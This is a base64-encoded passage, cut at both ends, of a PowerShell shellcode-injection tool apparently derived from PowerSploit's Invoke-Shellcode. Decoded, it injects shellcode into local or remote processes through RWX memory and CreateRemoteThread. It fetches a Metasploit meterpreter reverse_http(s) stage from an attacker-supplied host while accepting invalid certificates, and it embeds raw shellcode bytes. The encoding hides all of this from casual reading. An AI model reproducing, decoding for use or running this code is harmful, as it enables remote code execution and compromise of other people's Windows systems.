HNoZWxsY29kZSBmcm9tIHdpdGhpbiAzMi1iaXQgUG93ZXJzaGVsbC4gVXNlIHRoZSA2NC1iaXQgdmVyc2lvbiBvZiBQb3dlcnNoZWxsIGlmIHlvdSB3YW50IHRoaXMgdG8gd29yay4nCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkSXNXb3c2NCkgIyAzMi1iaXQgV293NjQgcHJvY2VzcwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoJFNoZWxsY29kZTMyLkxlbmd0aCAtZXEgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRTaGVsbGNvZGUgPSAkU2hlbGxjb2RlMzIKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0luamVjdGluZyBpbnRvIGEgV293NjQgcHJvY2Vzcy4nCiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlICMgNjQtYml0IHByb2Nlc3MKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgJ05vIHNoZWxsY29kZSB3YXMgcGxhY2VkIGluIHRoZSAkU2hlbGxjb2RlNjQgdmFyaWFibGUhJwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyA2NC1iaXQgc2hlbGxjb2RlLicKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlICMgMzItYml0IENQVQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGUzMi5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTMyIHZhcmlhYmxlIScKICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CgogICAgICAgICMgUmVzZXJ2ZSBhbmQgY29tbWl0IGVub3VnaCBtZW1vcnkgaW4gcmVtb3RlIHByb2Nlc3MgdG8gaG9sZCB0aGUgc2hlbGxjb2RlCiAgICAgICAgJFJlbW90ZU1lbUFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIAogICAgICAgIGlmICghJFJlbW90ZU1lbUFkZHIpCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIHNoZWxsY29kZSBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJTaGVsbGNvZGUgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkUmVtb3RlTWVtQWRkci5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgaW50byB0aGUgcHJldmlvdXNseSBhbGxvY2F0ZWQgbWVtb3J5CiAgICAgICAgJFdyaXRlUHJvY2Vzc01lbW9yeS5JbnZva2UoJGhQcm9jZXNzLCAkUmVtb3RlTWVtQWRkciwgJFNoZWxsY29kZSwgJFNoZWxsY29kZS5MZW5ndGgsIFtSZWZdIDApIHwgT3V0LU51bGwKCiAgICAgICAgIyBHZXQgYWRkcmVzcyBvZiBFeGl0VGhyZWFkIGZ1bmN0aW9uCiAgICAgICAgJEV4aXRUaHJlYWRBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBFeGl0VGhyZWFkCgogICAgICAgIGlmICgkSXNXb3c2NCkKICAgICAgICB7CiAgICAgICAgICAgICMgQnVpbGQgMzItYml0IGlubGluZSBhc3NlbWJseSBzdHViIHRvIGNhbGwgdGhlIHNoZWxsY29kZSB1cG9uIGNyZWF0aW9uIG9mIGEgcmVtb3RlIHRocmVhZC4KICAgICAgICAgICAgJENhbGxTdHViID0gRW1pdC1DYWxsVGhyZWFkU3R1YiAkUmVtb3RlTWVtQWRkciAkRXhpdFRocmVhZEFkZHIgMzIKICAgICAgICAgICAgCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ0VtaXR0aW5nIDMyLWJpdCBhc3NlbWJseSBjYWxsIHN0dWIuJwogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAjIEJ1aWxkIDY0LWJpdCBpbmxpbmUgYXNzZW1ibHkgc3R1YiB0byBjYWxsIHRoZSBzaGVsbGNvZGUgdXBvbiBjcmVhdGlvbiBvZiBhIHJlbW90ZSB0aHJlYWQuCiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJFJlbW90ZU1lbUFkZHIgJEV4aXRUaHJlYWRBZGRyIDY0CiAgICAgICAgICAgIAogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdFbWl0dGluZyA2NC1iaXQgYXNzZW1ibHkgY2FsbCBzdHViLicKICAgICAgICB9CgogICAgICAgICMgQWxsb2NhdGUgaW5saW5lIGFzc2VtYmx5IHN0dWIKICAgICAgICAkUmVtb3RlU3R1YkFkZHIgPSAkVmlydHVhbEFsbG9jRXguSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sICRDYWxsU3R1Yi5MZW5ndGgsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICAKICAgICAgICBpZiAoISRSZW1vdGVTdHViQWRkcikKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1YiBtZW1vcnkgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBXcml0ZS1WZXJib3NlICJUaHJlYWQgY2FsbCBzdHViIG1lbW9yeSByZXNlcnZlZCBhdCAweCQoJFJlbW90ZVN0dWJBZGRyLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBXcml0ZSAzMi1iaXQgYXNzZW1ibHkgc3R1YiB0byByZW1vdGUgcHJvY2VzcyBtZW1vcnkgc3BhY2UKICAgICAgICAkV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkaFByb2Nlc3MsICRSZW1vdGVTdHViQWRkciwgJENhbGxTdHViLCAkQ2FsbFN0dWIuTGVuZ3RoLCBbUmVmXSAwKSB8IE91dC1OdWxsCgogICAgICAgICMgRXhlY3V0ZSBzaGVsbGNvZGUgYXMgYSByZW1vdGUgdGhyZWFkCiAgICAgICAgJFRocmVhZEhhbmRsZSA9ICRDcmVhdGVSZW1vdGVUaHJlYWQuSW52b2tlKCRoUHJvY2VzcywgW0ludFB0cl06Olplcm8sIDAsICRSZW1vdGVTdHViQWRkciwgJFJlbW90ZU1lbUFkZHIsIDAsIFtJbnRQdHJdOjpaZXJvKQogICAgICAgIAogICAgICAgIGlmICghJFRocmVhZEhhbmRsZSkKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gbGF1bmNoIHJlbW90ZSB0aHJlYWQgaW4gUElEOiAkUHJvY2Vzc0lEIgogICAgICAgIH0KCiAgICAgICAgIyBDbG9zZSBwcm9jZXNzIGhhbmRsZQogICAgICAgICRDbG9zZUhhbmRsZS5JbnZva2UoJGhQcm9jZXNzKSB8IE91dC1OdWxsCgogICAgICAgIFdyaXRlLVZlcmJvc2UgJ1NoZWxsY29kZSBpbmplY3Rpb24gY29tcGxldGUhJwogICAgfQoKICAgIGZ1bmN0aW9uIExvY2FsOkluamVjdC1Mb2NhbFNoZWxsY29kZQogICAgewogICAgICAgIGlmICgkUG93ZXJTaGVsbDMyYml0KSB7CiAgICAgICAgICAgIGlmICgkU2hlbGxjb2RlMzIuTGVuZ3RoIC1lcSAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAnTm8gc2hlbGxjb2RlIHdhcyBwbGFjZWQgaW4gdGhlICRTaGVsbGNvZGUzMiB2YXJpYWJsZSEnCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgfQogICAgICAgICAgICAKICAgICAgICAgICAgJFNoZWxsY29kZSA9ICRTaGVsbGNvZGUzMgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdVc2luZyAzMi1iaXQgc2hlbGxjb2RlLicKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYgKCRTaGVsbGNvZGU2NC5MZW5ndGggLWVxIDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFRocm93ICdObyBzaGVsbGNvZGUgd2FzIHBsYWNlZCBpbiB0aGUgJFNoZWxsY29kZTY0IHZhcmlhYmxlIScKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICB9CiAgICAgICAgICAgIAogICAgICAgICAgICAkU2hlbGxjb2RlID0gJFNoZWxsY29kZTY0CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJ1VzaW5nIDY0LWJpdCBzaGVsbGNvZGUuJwogICAgICAgIH0KICAgIAogICAgICAgICMgQWxsb2NhdGUgUldYIG1lbW9yeSBmb3IgdGhlIHNoZWxsY29kZQogICAgICAgICRCYXNlQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkU2hlbGxjb2RlLkxlbmd0aCArIDEsIDB4MzAwMCwgMHg0MCkgIyAoUmVzZXJ2ZXxDb21taXQsIFJXWCkKICAgICAgICBpZiAoISRCYXNlQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgc2hlbGxjb2RlIG1lbW9yeSBpbiBQSUQ6ICRQcm9jZXNzSUQiCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlNoZWxsY29kZSBtZW1vcnkgcmVzZXJ2ZWQgYXQgMHgkKCRCYXNlQWRkcmVzcy5Ub1N0cmluZygiWCQoW0ludFB0cl06OlNpemUqMikiKSkiCgogICAgICAgICMgQ29weSBzaGVsbGNvZGUgdG8gUldYIGJ1ZmZlcgogICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJFNoZWxsY29kZSwgMCwgJEJhc2VBZGRyZXNzLCAkU2hlbGxjb2RlLkxlbmd0aCkKICAgICAgICAKICAgICAgICAjIEdldCBhZGRyZXNzIG9mIEV4aXRUaHJlYWQgZnVuY3Rpb24KICAgICAgICAkRXhpdFRocmVhZEFkZHIgPSBHZXQtUHJvY0FkZHJlc3Mga2VybmVsMzIuZGxsIEV4aXRUaHJlYWQKICAgICAgICAKICAgICAgICBpZiAoJFBvd2VyU2hlbGwzMmJpdCkKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciAzMgogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgMzItYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRDYWxsU3R1YiA9IEVtaXQtQ2FsbFRocmVhZFN0dWIgJEJhc2VBZGRyZXNzICRFeGl0VGhyZWFkQWRkciA2NAogICAgICAgICAgICAKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAnRW1pdHRpbmcgNjQtYml0IGFzc2VtYmx5IGNhbGwgc3R1Yi4nCiAgICAgICAgfQoKICAgICAgICAjIEFsbG9jYXRlIFJXWCBtZW1vcnkgZm9yIHRoZSB0aHJlYWQgY2FsbCBzdHViCiAgICAgICAgJENhbGxTdHViQWRkcmVzcyA9ICRWaXJ0dWFsQWxsb2MuSW52b2tlKFtJbnRQdHJdOjpaZXJvLCAkQ2FsbFN0dWIuTGVuZ3RoICsgMSwgMHgzMDAwLCAweDQwKSAjIChSZXNlcnZlfENvbW1pdCwgUldYKQogICAgICAgIGlmICghJENhbGxTdHViQWRkcmVzcykKICAgICAgICB7CiAgICAgICAgICAgIFRocm93ICJVbmFibGUgdG8gYWxsb2NhdGUgdGhyZWFkIGNhbGwgc3R1Yi4iCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlRocmVhZCBjYWxsIHN0dWIgbWVtb3J5IHJlc2VydmVkIGF0IDB4JCgkQ2FsbFN0dWJBZGRyZXNzLlRvU3RyaW5nKCJYJChbSW50UHRyXTo6U2l6ZSoyKSIpKSIKCiAgICAgICAgIyBDb3B5IGNhbGwgc3R1YiB0byBSV1ggYnVmZmVyCiAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6Q29weSgkQ2FsbFN0dWIsIDAsICRDYWxsU3R1YkFkZHJlc3MsICRDYWxsU3R1Yi5MZW5ndGgpCgogICAgICAgICMgTGF1bmNoIHNoZWxsY29kZSBpbiBpdCdzIG93biB0aHJlYWQKICAgICAgICAkVGhyZWFkSGFuZGxlID0gJENyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIDAsICRDYWxsU3R1YkFkZHJlc3MsICRCYXNlQWRkcmVzcywgMCwgW0ludFB0cl06Olplcm8pCiAgICAgICAgaWYgKCEkVGhyZWFkSGFuZGxlKQogICAgICAgIHsKICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byBsYXVuY2ggdGhyZWFkLiIKICAgICAgICB9CgogICAgICAgICMgV2FpdCBmb3Igc2hlbGxjb2RlIHRocmVhZCB0byB0ZXJtaW5hdGUKICAgICAgICAkV2FpdEZvclNpbmdsZU9iamVjdC5JbnZva2UoJFRocmVhZEhhbmRsZSwgMHhGRkZGRkZGRikgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgICRWaXJ0dWFsRnJlZS5JbnZva2UoJENhbGxTdHViQWRkcmVzcywgJENhbGxTdHViLkxlbmd0aCArIDEsIDB4ODAwMCkgfCBPdXQtTnVsbCAjIE1FTV9SRUxFQVNFICgweDgwMDApCiAgICAgICAgJFZpcnR1YWxGcmVlLkludm9rZSgkQmFzZUFkZHJlc3MsICRTaGVsbGNvZGUuTGVuZ3RoICsgMSwgMHg4MDAwKSB8IE91dC1OdWxsICMgTUVNX1JFTEVBU0UgKDB4ODAwMCkKCiAgICAgICAgV3JpdGUtVmVyYm9zZSAnU2hlbGxjb2RlIGluamVjdGlvbiBjb21wbGV0ZSEnCiAgICB9CgogICAgIyBBIHZhbGlkIHBvaW50ZXIgdG8gSXNXb3c2NFByb2Nlc3Mgd2lsbCBiZSByZXR1cm5lZCBpZiBDUFUgaXMgNjQtYml0CiAgICAkSXNXb3c2NFByb2Nlc3NBZGRyID0gR2V0LVByb2NBZGRyZXNzIGtlcm5lbDMyLmRsbCBJc1dvdzY0UHJvY2VzcwogICAgaWYgKCRJc1dvdzY0UHJvY2Vzc0FkZHIpCiAgICB7CiAgICAJJElzV293NjRQcm9jZXNzRGVsZWdhdGUgPSBHZXQtRGVsZWdhdGVUeXBlIEAoW0ludFB0cl0sIFtCb29sXS5NYWtlQnlSZWZUeXBlKCkpIChbQm9vbF0pCiAgICAJJElzV293NjRQcm9jZXNzID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0RGVsZWdhdGVGb3JGdW5jdGlvblBvaW50ZXIoJElzV293NjRQcm9jZXNzQWRkciwgJElzV293NjRQcm9jZXNzRGVsZWdhdGUpCiAgICAgICAgCiAgICAgICAgJDY0Yml0Q1BVID0gJHRydWUKICAgIH0KICAgIGVsc2UKICAgIHsKICAgIAkkNjRiaXRDUFUgPSAkZmFsc2UKICAgIH0KCiAgICBpZiAoW0ludFB0cl06OlNpemUgLWVxIDQpCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICR0cnVlCiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFBvd2VyU2hlbGwzMmJpdCA9ICRmYWxzZQogICAgfQoKICAgIGlmICgkUHNDbWRsZXQuUGFyYW1ldGVyU2V0TmFtZSAtZXEgJ01ldGFzcGxvaXQnKQogICAgewogICAgICAgIGlmICghJFBvd2VyU2hlbGwzMmJpdCkgewogICAgICAgICAgICAjIFRoZSBjdXJyZW50bHkgc3VwcG9ydGVkIE1ldGFzcGxvaXQgUGxzIGFyZSAzMi1iaXQuIFRoaXMgYmxvY2sgb2YgY29kZSBpbXBsZW1lbnRzIHRoZSBsb2dpYyB0byBleGVjdXRlIHRoaXMgc2NyaXB0IGZyb20gMzItYml0IFBvd2VyU2hlbGwKICAgICAgICAgICAgIyBHZXQgdGhpcyBzY3JpcHQncyBjb250ZW50cyBhbmQgcGFzcyBpdCB0byAzMi1iaXQgcG93ZXJzaGVsbCB3aXRoIHRoZSBzYW1lIHBhcmFtZXRlcnMgcGFzc2VkIHRvIHRoaXMgZnVuY3Rpb24KCiAgICAgICAgICAgICMgUHVsbCBvdXQganVzdCB0aGUgY29udGVudCBvZiB0aGUgdGhpcyBzY3JpcHQncyBpbnZvY2F0aW9uLgogICAgICAgICAgICAkUm9vdEludm9jYXRpb24gPSAkTXlJbnZvY2F0aW9uLkxpbmUKCiAgICAgICAgICAgICRSZXNwb25zZSA9ICRUcnVlCiAgICAgICAgCiAgICAgICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSB3YW50IHRvIGxhdW5jaCB0aGUgUGwgZnJvbSB4ODYgUG93ZXJzaGVsbD8iLAogICAgICAgICAgICAgICAgICAgIkF0dGVtcHQgdG8gZXhlY3V0ZSAzMi1iaXQgc2hlbGxjb2RlIGZyb20gNjQtYml0IFBvd2Vyc2hlbGwuIE5vdGU6IFRoaXMgcHJvY2VzcyB0YWtlcyBhYm91dCBvbmUgbWludXRlLiBCZSBwYXRpZW50ISBZb3Ugd2lsbCBhbHNvIHNlZSBzb21lIGFydGlmYWN0cyBvZiB0aGUgc2NyaXB0IGxvYWRpbmcgaW4gdGhlIG90aGVyIHByb2Nlc3MuIiApICkgKSB7IH0KICAgICAgICAKICAgICAgICAgICAgaWYgKCAhJFJlc3BvbnNlICkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgIyBVc2VyIG9wdGVkIG5vdCB0byBsYXVuY2ggdGhlIDMyLWJpdCBQbCBmcm9tIDMyLWJpdCBQb3dlclNoZWxsLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgICAgICBSZXR1cm4KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBTaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgcnVuIGluIGEgbm9uaW50ZXJhY3RpdmUgaW5zdGFuY2Ugb2YgUG93ZXJTaGVsbCwgbWFrZSBzdXJlIHRoZSAtRm9yY2Ugc3dpdGNoIGlzIGluY2x1ZGVkIHNvIHRoYXQgdGhlcmUgaXMgbm8gd2FybmluZyBwcm9tcHQuCiAgICAgICAgICAgIGlmICgkTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1snRm9yY2UnXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIgogICAgICAgICAgICAgICAgJENvbW1hbmQgPSAiZnVuY3Rpb24gJCgkTXlJbnZvY2F0aW9uLkludm9jYXRpb25OYW1lKSB7YG4iICsgJE15SW52b2NhdGlvbi5NeUNvbW1hbmQuU2NyaXB0QmxvY2sgKyAiYG59YG4kKCRSb290SW52b2NhdGlvbilgbmBuIgogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRXhlY3V0aW5nIHRoZSBmb2xsb3dpbmcgZnJvbSAzMi1iaXQgUG93ZXJTaGVsbDogJFJvb3RJbnZvY2F0aW9uIC1Gb3JjZSIKICAgICAgICAgICAgICAgICRDb21tYW5kID0gImZ1bmN0aW9uICQoJE15SW52b2NhdGlvbi5JbnZvY2F0aW9uTmFtZSkge2BuIiArICRNeUludm9jYXRpb24uTXlDb21tYW5kLlNjcmlwdEJsb2NrICsgImBufWBuJCgkUm9vdEludm9jYXRpb24pIC1Gb3JjZWBuYG4iCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRDb21tYW5kQnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpBc2NpaS5HZXRCeXRlcygkQ29tbWFuZCkKICAgICAgICAgICAgJEVuY29kZWRDb21tYW5kID0gW0NvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkQ29tbWFuZEJ5dGVzKQoKICAgICAgICAgICAgJEV4ZWN1dGUgPSAnJENvbW1hbmQnICsgIiB8ICRFbnY6d2luZGlyXFN5c1dPVzY0XFdpbmRvd3NQb3dlclNoZWxsXHYxLjBccG93ZXJzaGVsbC5leGUgLU5vUHJvZmlsZSAtQ29tbWFuZCAtIgogICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAtQ29tbWFuZCAkRXhlY3V0ZSB8IE91dC1OdWxsCgogICAgICAgICAgICAjIEV4aXQgdGhlIHNjcmlwdCBzaW5jZSB0aGUgc2hlbGxjb2RlIHdpbGwgYmUgcnVubmluZyBmcm9tIHg4NiBQb3dlclNoZWxsCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICAkUmVzcG9uc2UgPSAkVHJ1ZQogICAgICAgIAogICAgICAgIGlmICggJEZvcmNlIC1vciAoICRSZXNwb25zZSA9ICRwc0NtZGxldC5TaG91bGRDb250aW51ZSggIkRvIHlvdSBrbm93IHdoYXQgeW91J3JlIGRvaW5nPyIsCiAgICAgICAgICAgICAgICJBYm91dCB0byBkb3dubG9hZCBNZXRhc3Bsb2l0IFBsICckKCRQbCknIEg9JCgkSCksIE89JCgkTykiICkgKSApIHsgfQogICAgICAgIAogICAgICAgIGlmICggISRSZXNwb25zZSApCiAgICAgICAgewogICAgICAgICAgICAjIFVzZXIgb3B0ZWQgbm90IHRvIGNhcnJ5IG91dCBkb3dubG9hZCBvZiBNZXRhc3Bsb2l0IFBsLiBFeGl0IGZ1bmN0aW9uCiAgICAgICAgICAgIFJldHVybgogICAgICAgIH0KICAgICAgICAKICAgICAgICBzd2l0Y2ggKCRQbCkKICAgICAgICB7CiAgICAgICAgICAgICd3aW5kb3dzL21ldGVycHJldGVyL3JldmVyc2VfaHR0cCcKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNTTCA9ICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICdyX2h0dHBzJwogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkU1NMID0gJ3MnCiAgICAgICAgICAgICAgICAjIEFjY2VwdCBpbnZhbGlkIGNlcnRpZmljYXRlcwogICAgICAgICAgICAgICAgW1N5c3RlbS5OZXQuU2VydmljZVBvaW50TWFuYWdlcl06OlNlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrID0geyAkdHJ1ZSB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgIyBNZXRlcnByZXRlciBleHBlY3RzICdJTklUTScgaW4gdGhlIFVSSSBpbiBvcmRlciB0byBpbml0aWF0ZSBzdGFnZSAwLiBBd2Vzb21lIGF1dGhlbnRpY2F0aW9uLCBodWg/CiAgICAgICAgJFJlcXVlc3QgPSAiaHR0cCQoJFNTTCk6Ly8kKCRIKTokKCRPKS9JTklUTSIKICAgICAgICBXcml0ZS1WZXJib3NlICJSZXF1ZXN0aW5nIG1ldGVycHJldGVyIFBsIGZyb20gJFJlcXVlc3QiCiAgICAgICAgCiAgICAgICAgJFVyaSA9IE5ldy1PYmplY3QgVXJpKCRSZXF1ZXN0KQogICAgICAgICRXZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50CiAgICAgICAgJFdlYkNsaWVudC5IZWFkZXJzLkFkZCgndXNlci1hZ2VudCcsICIkVXNlckFnZW50IikKICAgICAgICAKICAgICAgICB0cnkKICAgICAgICB7CiAgICAgICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9ICRXZWJDbGllbnQuRG93bmxvYWREYXRhKCRVcmkpCiAgICAgICAgfQogICAgICAgIGNhdGNoCiAgICAgICAgewogICAgICAgICAgICBUaHJvdyAiJCgkRXJyb3JbMF0uRXhjZXB0aW9uLklubmVyRXhjZXB0aW9uLklubmVyRXhjZXB0aW9uLk1lc3NhZ2UpIgogICAgICAgIH0KICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlNjQgPSAkU2hlbGxjb2RlMzIKCiAgICB9CiAgICBlbHNlaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2hlbGxjb2RlJ10pCiAgICB7CiAgICAgICAgIyBVc2VycyBwYXNzaW5nIGluIHNoZWxsY29kZSAgdGhyb3VnaCB0aGUgJy1TaGVsbGNvZGUnIHBhcmFtZXRlciBhcmUgcmVzcG9uc2libGUgZm9yIGVuc3VyaW5nIGl0IHRhcmdldHMKICAgICAgICAjIHRoZSBjb3JyZWN0IGFyY2hpdGVjaHR1cmUgLSB4ODYgdnMuIHg2NC4gVGhpcyBzY3JpcHQgaGFzIG5vIHdheSB0byB2YWxpZGF0ZSB3aGF0IHlvdSBwcm92aWRlIGl0LgogICAgICAgIFtCeXRlW11dICRTaGVsbGNvZGUzMiA9ICRTaGVsbGNvZGUKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlNjQgPSAkU2hlbGxjb2RlMzIKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAjIFBvcCBhIGNhbGMuLi4gb3Igd2hhdGV2ZXIgc2hlbGxjb2RlIHlvdSBkZWNpZGUgdG8gcGxhY2UgaW4gaGVyZQogICAgICAgICMgSSBzaW5jZXJlbHkgaG9wZSB5b3UgdHJ1c3QgdGhhdCB0aGlzIHNoZWxsY29kZSBhY3R1YWxseSBwb3BzIGEgY2FsYy4uLgogICAgICAgICMgSW5zZXJ0IHlvdXIgc2hlbGxjb2RlIGhlcmUgaW4gdGhlIGZvciAweFhYLDB4WFgsLi4uCiAgICAgICAgIyAzMi1iaXQgUGwKICAgICAgICAjIG1zZlBsIHdpbmRvd3MvZXhlYyBDTUQ9ImNtZCAvayBjYWxjIiBFWElURlVOQz10aHJlYWQKICAgICAgICBbQnl0ZVtdXSAkU2hlbGxjb2RlMzIgPSBAKDB4ZmMsMHhlOCwweDg5LDB4MDAsMHgwMCwweDAwLDB4NjAsMHg4OSwweGU1LDB4MzEsMHhkMiwweDY0LDB4OGIsMHg1MiwweDMwLDB4OGIsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDUyLDB4MGMsMHg4YiwweDUyLDB4MTQsMHg4YiwweDcyLDB4MjgsMHgwZiwweGI3LDB4NGEsMHgyNiwweDMxLDB4ZmYsMHgzMSwweGMwLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHhhYywweDNjLDB4NjEsMHg3YywweDAyLDB4MmMsMHgyMCwweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHhlMiwweGYwLDB4NTIsMHg1NywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4OGIsMHg1MiwweDEwLDB4OGIsMHg0MiwweDNjLDB4MDEsMHhkMCwweDhiLDB4NDAsMHg3OCwweDg1LDB4YzAsMHg3NCwweDRhLDB4MDEsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweGQwLDB4NTAsMHg4YiwweDQ4LDB4MTgsMHg4YiwweDU4LDB4MjAsMHgwMSwweGQzLDB4ZTMsMHgzYywweDQ5LDB4OGIsMHgzNCwweDhiLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMSwweGQ2LDB4MzEsMHhmZiwweDMxLDB4YzAsMHhhYywweGMxLDB4Y2YsMHgwZCwweDAxLDB4YzcsMHgzOCwweGUwLDB4NzUsMHhmNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgI